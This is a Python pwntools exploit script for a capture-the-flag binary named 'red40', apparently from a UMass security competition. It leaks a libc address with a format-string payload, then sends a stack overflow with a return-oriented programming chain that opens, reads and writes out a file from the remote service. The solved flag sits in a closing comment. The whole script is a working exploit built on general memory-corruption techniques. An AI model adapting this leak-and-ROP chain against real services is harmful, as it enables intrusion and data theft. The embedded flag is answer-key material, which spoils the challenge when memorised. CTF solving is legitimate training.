#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./red40_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

REMOTE_NC_CMD    = "nc red40.ctf.umasscybersec.org 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *warn_get+124
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path, "loop"])
    
    if args.GDB:
        return gdb.debug([exe.path, "loop"], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = b"%1$p"

    r.sendline(b"3")

    r.sendline(payload)
    r.recvuntil(b"How will you warn the RED40?\n>\n")
    leak = int(r.recvline(),16)

    libc.address = leak - libc.sym._IO_2_1_stdin_-131

    rop = ROP(libc)

    POP_RDI = p64(rop.rdi.address)
    POP_RSI = p64(rop.rsi.address)
    POP_RDX_RBX = p64(rop.rdx.address)
    WRITABLE = p64(libc.sym.netlink_socket)

    payload = b"A"*0x38 + POP_RDI + p64(0) + POP_RSI + WRITABLE + POP_RDX_RBX + p64(8)*2 + p64(libc.sym.read)

    payload += POP_RDI + WRITABLE + POP_RSI + p64(0) + POP_RDX_RBX + p64(0)*2 + p64(libc.sym.open)

    payload += POP_RDI + p64(4) + POP_RSI + WRITABLE + POP_RDX_RBX + p64(10000)*2 + p64(libc.sym.read)

    payload += POP_RDI + p64(1) + POP_RSI + WRITABLE + POP_RDX_RBX + p64(10000)*2 + p64(libc.sym.write)

    r.sendline(payload)

    sleep(0.1)

    r.sendline(b"parent\x00")

    dump = r.recvall()

    print(dump[dump.find(b"UMASS{"):dump.find(b"UMASS{")+50])
    #UMASS{r0j0_4d_k33p!n6_y0u_r1ch_4$_h3ck!}

if __name__ == "__main__":
    main()